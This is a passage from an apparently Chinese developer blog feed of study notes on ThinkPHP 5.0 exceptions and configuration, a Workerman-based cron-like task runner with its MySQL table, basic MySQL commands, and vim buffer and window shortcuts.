class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h5 id="2-2-配置配置文件"><a href="#2-2-配置配置文件" class="headerlink" title="2.2 配置配置文件"></a>2.2 配置配置文件</h5><p>框架支持异常页面由开发者自定义类进行处理，需要配置参数<code>exception_handle</code><br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 异常处理handle类 留空使用 \think\exception\Handle</span></span><br><span class="line"><span class="string">'exception_handle'</span>       =&gt; <span class="string">'\\app\lib\exception\\ExceptionHandle'</span>,</span><br></pre></td></tr></table></figure></div></p>
<h5 id="2-3-好了，可以进行抛出了"><a href="#2-3-好了，可以进行抛出了" class="headerlink" title="2.3 好了，可以进行抛出了"></a>2.3 好了，可以进行抛出了</h5><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> \app\lib\<span class="keyword">exception</span>\BannerMissException();</span><br><span class="line">  <span class="comment">//也可以修改下参数</span></span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> \app\lib\<span class="keyword">exception</span>\BannerMissException([</span><br><span class="line">  		<span class="string">'code'</span>=&gt;<span class="number">1</span>,</span><br><span class="line">      <span class="string">'msg'</span>=&gt;<span class="number">2</span>,</span><br><span class="line">      <span class="string">'errorCode'</span>=&gt;<span class="number">3</span></span><br><span class="line">  ]);</span><br></pre></td></tr></table></figure></div>
<h4 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h4><p>&emsp;这个异常抛出有2种情况。一种是代码自己的异常，默认的错误信息<code>[&#39;code&#39;=&gt;500,&#39;msg&#39;=&gt;&#39;服务器内部错误，不能告诉你&#39;,&#39;errorCode&#39;=&gt;999]</code>,一种是主动抛出的。如<code>throw new \app\lib\exception\BannerMissException();</code> 。它的这个执行机制是，把一个类比如<code>BannerMissException</code>抛出后，由自定义异常类判断是否是属于其基类<code>BaseException</code>的这种异常的错误信息格式，如果是，就抛出<code>BannerMissException</code>的错误信息，如果不是，就抛出默认的错误信息<code>[&#39;code&#39;=&gt;500,&#39;msg&#39;=&gt;&#39;服务器内部错误，不能告诉你&#39;,&#39;errorCode&#39;=&gt;999]</code>。<br>&emsp;这种情况，TP5.0手册都有写的，可以查看 <span class="exturl" data-url="aHR0cHM6Ly93d3cua2FuY2xvdWQuY24vbWFudWFsL3RoaW5rcGhwNS8xMjYwNzU=" title="https://www.kancloud.cn/manual/thinkphp5/126075">https://www.kancloud.cn/manual/thinkphp5/126075<i class="fa fa-external-link"></i></span> 。</p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>TP5.0</tag>
      </tags>
  </entry>
  <entry>
    <title>「php」TP5.0学习笔记-配置</title>
    <url>/2018/06/11/%E3%80%90php%E3%80%91TP5-0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h4 id="1-配置统一配置目录"><a href="#1-配置统一配置目录" class="headerlink" title="1. 配置统一配置目录"></a>1. 配置统一配置目录</h4><p>说明：TP5.0默认的配置文件在应用<code>application</code>目录下,对整个应用都生效。模块中的配置文件对于该模块生效且优先于<code>application</code>的配置，模块配置文件不配置则不生。<br>定义统一的配置目录也是这样的层级关系，不过是把的配置文件统一放在自定义目录中而已。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在入口文件 。定义配置文件目录和应用目录同级</span></span><br><span class="line">define(<span class="string">'CONF_PATH'</span>, <span class="keyword">__DIR__</span>.<span class="string">'/../conf/'</span>);</span><br></pre></td></tr></table></figure></div></p>
<a id="more"></a>
<h2 id><a href="#" class="headerlink" title></a><img src="/uploads/20180611/1658.png" alt="conf配置目录"></h2>]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>TP5.0</tag>
      </tags>
  </entry>
  <entry>
    <title>【php】学习笔记-基于workerman定时类定时任务</title>
    <url>/2018/06/11/%E3%80%90php%E3%80%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9F%BA%E4%BA%8Eworkerman%E5%AE%9A%E6%97%B6%E7%B1%BB%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/</url>
    <content><![CDATA[<p>别人问怎么做定时任务？我说当然是<code>crontab</code>啊！！！做为一个<code>PHPER</code><br>只会用<code>crontab</code>真不好意思。不过，以下是基于常驻进程框架结合<code>mysql</code><br>做的定时信号。至少实现了定时不是？<br><a id="more"></a></p>
<ul>
<li>1,在项目要根目录安装依赖<code>composer require workerman/workerman</code></li>
<li><p>2,创建<code>start.php</code>并写入</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用说明   </span></span><br><span class="line"><span class="comment"> * 先切换到项目根目录下</span></span><br><span class="line"><span class="comment"> * 启动 php start.php start  这是调试模式，信息会直接echo出来 停止 按ctrl+c</span></span><br><span class="line"><span class="comment"> * 后台启动  php start.php  start -d 如果在调试模式下测试没有问题了。 真正使用的用后台模式，这样就算你人离线了程序也会在后台运行</span></span><br><span class="line"><span class="comment"> * 关闭后台  php start.php  stop</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">"/vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> \<span class="title">Workerman</span>\<span class="title">Worker</span>;</span><br><span class="line"><span class="keyword">use</span> \<span class="title">Workerman</span>\<span class="title">Lib</span>\<span class="title">Timer</span>;</span><br><span class="line"><span class="comment">// 检查扩展</span></span><br><span class="line"><span class="keyword">if</span>(!extension_loaded(<span class="string">'pcntl'</span>)) <span class="keyword">exit</span>(<span class="string">"需要pcntl扩展"</span>);</span><br><span class="line"><span class="keyword">if</span>(!extension_loaded(<span class="string">'posix'</span>)) <span class="keyword">exit</span>(<span class="string">"需要posix扩展"</span>);</span><br><span class="line"><span class="keyword">if</span>(!extension_loaded(<span class="string">'pdo'</span>)) <span class="keyword">exit</span>(<span class="string">"需要pdo扩展"</span>);</span><br><span class="line"><span class="keyword">if</span>(!extension_loaded(<span class="string">'pdo_mysql'</span>)) <span class="keyword">exit</span>(<span class="string">"需要pdo_mysql扩展"</span>);</span><br><span class="line"></span><br><span class="line">$task = <span class="keyword">new</span> Worker();</span><br><span class="line"><span class="comment">// 开启多少个进程运行定时任务，注意业务是否在多进程有并发问题</span></span><br><span class="line">$task-&gt;count = <span class="number">1</span>;</span><br><span class="line">$task-&gt;onWorkerStart = <span class="function"><span class="keyword">function</span><span class="params">($task)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 定时让程序每60秒执行一次</span></span><br><span class="line">    $time_interval = <span class="number">60</span>;</span><br><span class="line">    Timer::add($time_interval, <span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="comment">//连接数据库</span></span><br><span class="line">			$db = <span class="keyword">new</span> \Workerman\MySQL\Connection(</span><br><span class="line">				<span class="string">'127.0.0.1'</span>, <span class="comment">// host</span></span><br><span class="line">			  <span class="string">'3306'</span>, <span class="comment">//port</span></span><br><span class="line">			  <span class="string">'root'</span>,  <span class="comment">//username</span></span><br><span class="line">				<span class="string">'123qwe'</span>, <span class="comment">//password</span></span><br><span class="line">			  <span class="string">'crontab'</span> <span class="comment">//db_name 数据名</span></span><br><span class="line">			);</span><br><span class="line">			$has_data = $db-&gt;query(<span class="string">"SELECT * FROM `task`"</span>);</span><br><span class="line">       <span class="keyword">if</span> ($has_data) &#123;</span><br><span class="line">           <span class="comment">//当前时间</span></span><br><span class="line">           date_default_timezone_set(<span class="string">"PRC"</span>);</span><br><span class="line">           $minute = date(<span class="string">'i'</span>, time()); <span class="comment">//当前分</span></span><br><span class="line">           $hour   = date(<span class="string">'H'</span>, time()); <span class="comment">//当前时</span></span><br><span class="line">           $today  = date(<span class="string">'d'</span>, time()); <span class="comment">//当前天</span></span><br><span class="line">           $month  = date(<span class="string">'m'</span>, time()); <span class="comment">//当前月</span></span><br><span class="line">           $week   = date(<span class="string">'w'</span>, time()); <span class="comment">//当前周</span></span><br><span class="line">           <span class="keyword">foreach</span>($has_data <span class="keyword">as</span> $task)</span><br><span class="line">					 &#123;</span><br><span class="line">				       <span class="keyword">switch</span>($task[<span class="string">'type'</span>]) &#123;</span><br><span class="line">			             <span class="keyword">case</span> <span class="number">1</span> : </span><br><span class="line">                       <span class="comment">//每小时任务</span></span><br><span class="line">                       <span class="keyword">if</span>($task[<span class="string">'minute'</span>] == $minute) &#123;</span><br><span class="line">                             <span class="keyword">echo</span> $task[<span class="string">'task'</span>] . <span class="string">"\n"</span>;</span><br><span class="line">                       &#125;</span><br><span class="line">	                      <span class="keyword">break</span>;</span><br><span class="line">                   <span class="keyword">case</span> <span class="number">2</span> : <span class="comment">// 每天任务</span></span><br><span class="line">                       <span class="keyword">if</span>($task[<span class="string">'hour'</span>] == $hour &amp;&amp; $task[<span class="string">'minute'</span>] == $minute) &#123;</span><br><span class="line">                             <span class="keyword">echo</span> $task[<span class="string">'task'</span>] . <span class="string">"\n"</span>;</span><br><span class="line">												&#125;</span><br><span class="line">	                      <span class="keyword">break</span>;</span><br><span class="line">                   <span class="keyword">case</span> <span class="number">3</span> : <span class="comment">// 每月任务</span></span><br><span class="line">                       <span class="keyword">if</span>($task[<span class="string">'hour'</span>] == $hour &amp;&amp; $task[<span class="string">'minute'</span>] == $minute &amp;&amp; $task[<span class="string">'day'</span>] == $today) &#123;</span><br><span class="line">                             <span class="keyword">echo</span> $task[<span class="string">'task'</span>] . <span class="string">"\n"</span>;</span><br><span class="line">												&#125;</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">                   <span class="keyword">case</span> <span class="number">4</span> : <span class="comment">// 每星期每小时任务</span></span><br><span class="line">                       <span class="keyword">if</span>($task[<span class="string">'week'</span>] == $week &amp;&amp; $task[<span class="string">'minute'</span>] == $minute) &#123;</span><br><span class="line">                             <span class="keyword">echo</span> $task[<span class="string">'task'</span>] . <span class="string">"\n"</span>;</span><br><span class="line">												&#125;</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">                   <span class="keyword">case</span> <span class="number">5</span> : <span class="comment">// 每星期任务</span></span><br><span class="line">                       <span class="keyword">if</span>($task[<span class="string">'week'</span>] == $week &amp;&amp; $task[<span class="string">'minute'</span>] == $minute &amp;&amp; $task[<span class="string">'hour'</span>] == $hour) &#123;</span><br><span class="line">                             <span class="keyword">echo</span> $task[<span class="string">'task'</span>] . <span class="string">"\n"</span>;</span><br><span class="line">												&#125;</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">							 &#125;</span><br><span class="line">					 &#125;</span><br><span class="line">			 &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行worker</span></span><br><span class="line">Worker::runAll();</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>3，数据库 </p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">-- phpMyAdmin SQL Dump</span><br><span class="line">-- version 4.8.5</span><br><span class="line">-- https://www.phpmyadmin.net/</span><br><span class="line">--</span><br><span class="line">-- Host: localhost</span><br><span class="line">-- Generation Time: Jul 03, 2019 at 06:48 AM</span><br><span class="line">-- Server version: 10.3.15-MariaDB</span><br><span class="line">-- PHP Version: 7.3.5</span><br><span class="line"></span><br><span class="line">SET SQL_MODE = &quot;NO_AUTO_VALUE_ON_ZERO&quot;;</span><br><span class="line">SET AUTOCOMMIT = 0;</span><br><span class="line">START TRANSACTION;</span><br><span class="line">SET time_zone = &quot;+00:00&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;</span><br><span class="line">/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;</span><br><span class="line">/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;</span><br><span class="line">/*!40101 SET NAMES utf8mb4 */;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Database: `crontab`</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">-- --------------------------------------------------------</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Table structure for table `task`</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">CREATE TABLE `task` (</span><br><span class="line">  `t_id` int(10) NOT NULL,</span><br><span class="line">  `minute` int(2) DEFAULT NULL COMMENT &apos;分&apos;,</span><br><span class="line">  `hour` int(2) DEFAULT NULL COMMENT &apos;时&apos;,</span><br><span class="line">  `day` int(2) DEFAULT NULL COMMENT &apos;日&apos;,</span><br><span class="line">  `month` int(2) DEFAULT NULL COMMENT &apos;月&apos;,</span><br><span class="line">  `week` int(2) DEFAULT NULL COMMENT &apos;周&apos;,</span><br><span class="line">  `task` varchar(250) DEFAULT NULL COMMENT &apos;任务&apos;,</span><br><span class="line">  `type` int(1) NOT NULL DEFAULT 1 COMMENT &apos;类型1每小时，2每天，3每月，4每个星期每小时，5每个星期每小时&apos;</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Dumping data for table `task`</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">INSERT INTO `task` (`t_id`, `minute`, `hour`, `day`, `month`, `week`, `task`, `type`) VALUES</span><br><span class="line">(1, 34, NULL, NULL, NULL, NULL, &apos;每小时任务：你的任务是每个小时34分执行一次&apos;, 1),</span><br><span class="line">(2, 35, 14, NULL, NULL, NULL, &apos;每天任务：你的任务是14：35执行一次&apos;, 2),</span><br><span class="line">(3, 36, 14, 3, NULL, NULL, &apos;月期任务：你的任务是每个月 3号14：36执行一次&apos;, 3),</span><br><span class="line">(4, 37, NULL, NULL, NULL, 3, &apos;周期每小时任务：你的任务是每个星期3每个小时的37分执行一次&apos;, 4),</span><br><span class="line">(5, 38, 14, NULL, NULL, 3, &apos;周期小时任务：你的任务是每个星期01:01执行一次&apos;, 5);</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Indexes for dumped tables</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Indexes for table `task`</span><br><span class="line">--</span><br><span class="line">ALTER TABLE `task`</span><br><span class="line">  ADD PRIMARY KEY (`t_id`);</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- AUTO_INCREMENT for dumped tables</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- AUTO_INCREMENT for table `task`</span><br><span class="line">--</span><br><span class="line">ALTER TABLE `task`</span><br><span class="line">  MODIFY `t_id` int(10) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;</span><br><span class="line">COMMIT;</span><br><span class="line"></span><br><span class="line">/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;</span><br><span class="line">/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;</span><br><span class="line">/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;</span><br></pre></td></tr></table></figure></div>
</li>
</ul>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>TP5.0</tag>
      </tags>
  </entry>
  <entry>
    <title>【mySQL】mySQL学习笔记-基本常识</title>
    <url>/2018/06/10/%E3%80%90mySQL%E3%80%91mySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9F%BA%E6%9C%AC%E5%B8%B8%E8%AF%86/</url>
    <content><![CDATA[<h4 id="1-基本操作"><a href="#1-基本操作" class="headerlink" title="1.基本操作"></a>1.基本操作</h4><ul>
<li>1.1查看表结构<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">describe &lt;table name&gt; --查看表结构、</span><br></pre></td></tr></table></figure></div>
</li>
</ul>
<h4 id="1-1-数据表增删改查"><a href="#1-1-数据表增删改查" class="headerlink" title="1.1 数据表增删改查"></a>1.1 数据表增删改查</h4><h4 id="1-1-1-新建表格"><a href="#1-1-1-新建表格" class="headerlink" title="1.1.1 新建表格"></a>1.1.1 新建表格</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `runoob_tbl`(</span><br><span class="line">   `runoob_id` INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">   `runoob_title` VARCHAR(100) NOT NULL,</span><br><span class="line">   `runoob_author` VARCHAR(40) NOT NULL,</span><br><span class="line">   `submission_date` DATE,</span><br><span class="line">   PRIMARY KEY ( `runoob_id` )</span><br><span class="line">)ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure></div>
<h5 id="1-1-2-删除和添加主键"><a href="#1-1-2-删除和添加主键" class="headerlink" title="1.1.2 删除和添加主键"></a>1.1.2 删除和添加主键</h5> <div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">--先删除主键</span><br><span class="line">ALTER  TABLE  `table_name` DROP  PRIMARY KEY(字段);</span><br><span class="line">-- 增加主键</span><br><span class="line">ALTER TABLE `table_name` ADD PRIMARY KEY(字段)；</span><br></pre></td></tr></table></figure></div>
<h4 id="2-数据导出"><a href="#2-数据导出" class="headerlink" title="2. 数据导出"></a>2. 数据导出</h4><ul>
<li><p>2.1 导出数据和结构</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">mysqldump &lt;databaseName&gt; -r &lt;username&gt; -p&lt;passwd&gt; &gt; &lt;echoName&gt;.sql;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>2.2 导出数据和函数</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">mysqldump -h&lt;host&gt; -u&lt;username&gt; -p --opt -R &lt;databasename&gt; &gt; &lt;echoName&gt;;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>2.3 导出结构</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">mysqldump -h&lt;username&gt; -u&lt;username&gt; -p --opt --no-data &lt;databaseName&gt; &gt; &lt;echoName&gt;</span><br></pre></td></tr></table></figure></div>
</li>
</ul>
<h4 id="3-数据读写"><a href="#3-数据读写" class="headerlink" title="3. 数据读写"></a>3. 数据读写</h4><h5 id="3-1-自增更新"><a href="#3-1-自增更新" class="headerlink" title="3.1 自增更新"></a>3.1 自增更新</h5><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">UPDATE `videos` SET `views`=views+1 WHERE `id` = 1&#125;</span><br></pre></td></tr></table></figure></div>
<h5 id="3-2-指定字段部分内容替换更新"><a href="#3-2-指定字段部分内容替换更新" class="headerlink" title="3.2 指定字段部分内容替换更新"></a>3.2 指定字段部分内容替换更新</h5><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">update tableName set columnName = replace(columnName,&apos;string&apos;,&apos;targetString&apos;)</span><br></pre></td></tr></table></figure></div>
<h4 id="2-权限操作"><a href="#2-权限操作" class="headerlink" title="2. 权限操作"></a>2. 权限操作</h4><h5 id="2-1-数据库用户授权"><a href="#2-1-数据库用户授权" class="headerlink" title="2.1 数据库用户授权"></a>2.1 数据库用户授权</h5><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">grant all privileges on &lt;database_name&gt;.* to &apos;&lt;user_name&gt;&apos;@&apos;&lt;host&gt;&apos;;</span><br></pre></td></tr></table></figure></div>
]]></content>
      <tags>
        <tag>mySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>「php」TP5.0学习笔记-模型基本常识</title>
    <url>/2018/06/10/%E3%80%90php%E3%80%91TP5-0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%A8%A1%E5%9E%8B%E5%9F%BA%E6%9C%AC%E5%B8%B8%E8%AF%86/</url>
    <content><![CDATA[<h4 id="1-模型内置的查询方法"><a href="#1-模型内置的查询方法" class="headerlink" title="1. 模型内置的查询方法"></a>1. 模型内置的查询方法</h4><p>注:在控制器中引入模型后直接调用<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//查表的id数据单条数据</span></span><br><span class="line">modleName::get($id); </span><br><span class="line">modleName::find($id);</span><br><span class="line"><span class="comment">//查多条数据</span></span><br><span class="line">modleName::all();</span><br><span class="line">modleName::select();</span><br></pre></td></tr></table></figure></div></p>
<a id="more"></a>
<h4 id="2-Db另一种查询条件的法"><a href="#2-Db另一种查询条件的法" class="headerlink" title="2. Db另一种查询条件的法"></a>2. Db另一种查询条件的法</h4><p>注：不能在里面where的闭包中使用select()方法<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">Db::name(&lt;table name&gt;)</span><br><span class="line">-&gt;where(<span class="function"><span class="keyword">function</span><span class="params">($query)</span><span class="title">use</span><span class="params">($id,$gid)</span></span>&#123;</span><br><span class="line">    $query-&gt;where(<span class="string">"id=&#123;$id&#125;"</span>)-&gt;where(<span class="string">"gid=&#123;$gid&#125;"</span>)-&gt;where...;</span><br><span class="line">        &#125;)</span><br><span class="line">-&gt;select();</span><br></pre></td></tr></table></figure></div></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>TP5.0</tag>
      </tags>
  </entry>
  <entry>
    <title>「vim」vim学习笔记一 基本常识</title>
    <url>/2018/06/05/vim%E7%AC%94%E8%AE%B0%E4%B8%80-%E5%9F%BA%E6%9C%AC%E5%B8%B8%E8%AF%86/</url>
    <content><![CDATA[<h3 id="1-启动vim"><a href="#1-启动vim" class="headerlink" title="1.启动vim"></a>1.启动vim</h3><table>
<thead>
<tr>
<th style="text-align:center">说明</th>
<th style="text-align:center">命令行</th>
<th style="text-align:center">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">打开文件</td>
<td style="text-align:center"><code>vim &lt;filename 1&gt; &lt;filename 2&gt; ...</code></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">水平打开文件</td>
<td style="text-align:center"><code>vim -o &lt;filename 1&gt;&lt;filename 2&gt; ...</code></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">垂直打开文件</td>
<td style="text-align:center"><code>vim -O &lt;filename 1&gt;&lt;filename 2&gt; ...</code></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">末行行首</td>
<td style="text-align:center"><code>vim +&lt;filename&gt;</code></td>
<td style="text-align:center">光标位置</td>
</tr>
<tr>
<td style="text-align:center">指定行号</td>
<td style="text-align:center"><code>vim +&lt;number&gt;&lt;filename&gt;</code></td>
<td style="text-align:center">光标位置</td>
</tr>
<tr>
<td style="text-align:center">指定关键词</td>
<td style="text-align:center"><code>vim +/&lt;keyword&gt;&lt;filename&gt;</code></td>
<td style="text-align:center"><code>n</code>或<code>N</code>切换</td>
</tr>
</tbody>
</table>
<a id="more"></a>
<h3 id="2-文件切换操作"><a href="#2-文件切换操作" class="headerlink" title="2.文件切换操作"></a>2.文件切换操作</h3><table>
<thead>
<tr>
<th style="text-align:center">说明</th>
<th style="text-align:center">操作</th>
<th style="text-align:center">示例</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">多个文件切换</td>
<td style="text-align:center"><code>:bn</code>下一个文件;<code>:bp</code>上一个文件</td>
<td style="text-align:center"><code>:bn</code>下一个文件</td>
</tr>
<tr>
<td style="text-align:center">查看已打开的文件列表(buffer文件l)</td>
<td style="text-align:center"><code>:ls(或:files);或:buffers</code></td>
<td style="text-align:center"><code>:buffers</code></td>
</tr>
<tr>
<td style="text-align:center">正在编辑文件名</td>
<td style="text-align:center"><code>:f(或:file)</code></td>
<td style="text-align:center"><code>:file</code></td>
</tr>
<tr>
<td style="text-align:center">切换文件</td>
<td style="text-align:center"><code>:n &lt;filename&gt;</code></td>
<td style="text-align:center"><code>:n log</code>切换到log文件</td>
</tr>
<tr>
<td style="text-align:center">切换buffer文件</td>
<td style="text-align:center"><code>:b &lt;id&gt;</code></td>
<td style="text-align:center"><code>:b 1</code> 切换buffer id 1文件</td>
</tr>
<tr>
<td style="text-align:center">关闭当前文件缓存</td>
<td style="text-align:center"><code>:bd</code></td>
<td style="text-align:center"><code>:bd</code> 关闭当前缓存文件</td>
</tr>
<tr>
<td style="text-align:center">关闭文件缓存</td>
<td style="text-align:center"><code>:b&lt;id&gt;</code></td>
<td style="text-align:center"><code>:b 2</code> 清除buffer id 为2的文件的缓存</td>
</tr>
<tr>
<td style="text-align:center">打开文件</td>
<td style="text-align:center"><code>:e &lt;filename&gt;</code></td>
<td style="text-align:center"><code>:e log</code> 打开log文件</td>
</tr>
<tr>
<td style="text-align:center">清空buffer</td>
<td style="text-align:center"><code>:bufdo bd</code></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">清空指定范围的buffer</td>
<td style="text-align:center"><code>:&lt;startNum&gt;,&lt;endNum&gt;bd</code></td>
<td style="text-align:center">&emsp;</td>
</tr>
</tbody>
</table>
<h3 id="3-分屏操作"><a href="#3-分屏操作" class="headerlink" title="3.分屏操作"></a>3.分屏操作</h3><table>
<thead>
<tr>
<th style="text-align:center">效果</th>
<th style="text-align:center">命令行</th>
<th style="text-align:center">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">水平分割屏幕</td>
<td style="text-align:center"><code>:split &lt;filename&gt;;或:sp &lt;filename&gt;</code></td>
<td style="text-align:center">并在另一窗口打开另一文件</td>
</tr>
<tr>
<td style="text-align:center">垂直分割屏幕</td>
<td style="text-align:center"><code>:vsplit &lt;filename&gt;;或:vsp &lt;filename&gt;</code></td>
<td style="text-align:center">同上</td>
</tr>
<tr>
<td style="text-align:center">切换窗口</td>
<td style="text-align:center"><code>ctr+ww;或ctr+w/k/j/h/l(上下左右)</code></td>
<td style="text-align:center">切换的方向是由上到下由左到右</td>
</tr>
<tr>
<td style="text-align:center">窗口水平调整</td>
<td style="text-align:center"><code>:&lt;num&gt;winc+;或:&lt;num&gt;winc-</code> 放大或缩小</td>
<td style="text-align:center">放大的窗口的方向相对屏幕边</td>
</tr>
<tr>
<td style="text-align:center">窗口垂直调整</td>
<td style="text-align:center"><code>:&lt;num&gt;winc&gt;;或:&lt;num&gt;winc&lt;</code> 放大或缩小</td>
<td style="text-align:center">放大的窗口的方向相对屏幕边</td>
</tr>
<tr>
<td style="text-align:center">窗口垂直调整</td>
<td style="text-align:center"><code>:&lt;num&gt;winc&gt;;或:&lt;num&gt;winc&lt;</code> 放大或缩小</td>
<td style="text-align:center">放大的窗口的方向相对屏幕边</td>
</tr>
<tr>
<td style="text-align:center">新建空白窗口</td>
<td style="text-align:center"><code>&lt; C+w+n &gt;</code></td>
<td style="text-align:center"><code>:w &lt;newFilename</code>保存新文件</td>
</tr>
<tr>
<td style="text-align:center">水平窗口</td>
<td style="text-align:center"><code>&lt; C+w+s &gt;</code></td>
<td style="text-align:center">当前文件水平打开</td>
</tr>
<tr>
<td style="text-align:center">垂直窗口</td>
<td style="text-align:center"><code>&lt; C+w+v &gt;</code></td>
<td style="text-align:center">当前文件垂直打开</td>
</tr>
<tr>
<td style="text-align:center">关闭当前窗口</td>
<td style="text-align:center"><code>&lt; C+w+c &gt;</code></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">关闭其它窗口</td>
